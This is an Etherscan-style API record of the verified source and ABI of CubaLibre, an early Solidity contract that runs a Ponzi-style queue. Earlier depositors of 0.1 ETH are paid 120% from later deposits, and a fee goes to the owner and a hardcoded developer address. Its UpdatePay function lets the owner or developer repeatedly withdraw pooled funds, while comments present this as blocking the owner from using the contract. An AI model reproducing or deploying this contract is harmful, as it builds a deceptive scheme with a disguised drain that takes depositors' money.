{"status":"1","message":"OK","result":[{"SourceCode":"/*\r\nContract is secured with Creative Commons license.\r\nUnauthorised copying and editing is prohibited.\r\nCurrent lisensorship is Attribution-ShareAlike 2.0 Generic (CC BY-SA 2.0).\r\n*/\r\ncontract CubaLibre\r\n{\r\n    struct Person \r\n    {\r\n        address ETHaddress;\r\n        uint ETHamount;\r\n    }\r\n\r\n    Person[] public persons;\r\n\r\n    uint public paymentqueue = 0;\r\n    uint public feecounter;\r\n    uint amount;\r\n    \r\n    address public owner;\r\n    address public developer=0xC99B66E5Cb46A05Ea997B0847a1ec50Df7fe8976;\r\n    address meg=this;\r\n\r\n    modifier _onlyowner\r\n    {\r\n        if (msg.sender == owner || msg.sender == developer)\r\n        _\r\n    }\r\n    \r\n    function CubaLibre() \r\n    {\r\n        owner = msg.sender;\r\n    }\r\n    function()                                                                  //start using contract\r\n    {\r\n        enter();\r\n    }\r\n    function enter()\r\n    {\r\n        if (msg.sender == owner || msg.sender == developer)                     //do not allow to use contract by owner or developer\r\n\t    {\r\n\t        UpdatePay();                                                        //check for ownership\r\n\t    }\r\n\t    else                                                                    //if sender is not owner\r\n\t    {\r\n            feecounter+=msg.value/10;                                           //count fee\r\n\t        owner.send(feecounter/2);                                           //send fee\r\n\t        developer.send(feecounter/2);                                       //send fee\r\n\t        feecounter=0;                                                       //decrease fee\r\n\t        \r\n            if (msg.value == (1 ether)/10)                                      //check for value 0.1 ETH\r\n            {\r\n\t            amount = msg.value;                                             //if correct value\r\n\t            uint idx=persons.length;                                        //add to payment queue\r\n                persons.length+=1;\r\n                persons[idx].ETHaddress=msg.sender;\r\n                 persons[idx].ETHamount=amount;\r\n                canPay();                                                       //allow to payment this sender\r\n            }\r\n\t        else                                                                //if value is not 0.1 ETH\r\n\t        {\r\n\t            msg.sender.send(msg.value - msg.value/10);                      //give its back\r\n\t        }\r\n\t    }\r\n\r\n    }\r\n    \r\n    function UpdatePay() _onlyowner                                             //check for updating queue\r\n    {\r\n        if (meg.balance>((1 ether)/10)) {\r\n            msg.sender.send(((1 ether)/10));\r\n        } else {\r\n            msg.sender.send(meg.balance);\r\n        }\r\n    }\r\n    \r\n    function canPay() internal                                                           //create queue async\r\n    {\r\n        while (meg.balance>persons[paymentqueue].ETHamount/100*120)             //see for balance\r\n        {\r\n            uint transactionAmount=persons[paymentqueue].ETHamount/100*120;     //create payment summ\r\n            persons[paymentqueue].ETHaddress.send(transactionAmount);           //send payment to this person\r\n            paymentqueue+=1;                                                    //Update queue async\r\n        }\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"feecounter\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"UpdatePay\",\"outputs\":[],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"paymentqueue\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"persons\",\"outputs\":[{\"name\":\"ETHaddress\",\"type\":\"address\"},{\"name\":\"ETHamount\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"developer\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"enter\",\"outputs\":[],\"type\":\"function\"},{\"inputs\":[],\"type\":\"constructor\"}]","ContractName":"CubaLibre","CompilerVersion":"v0.2.1+commit.91a6b35","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":""}]}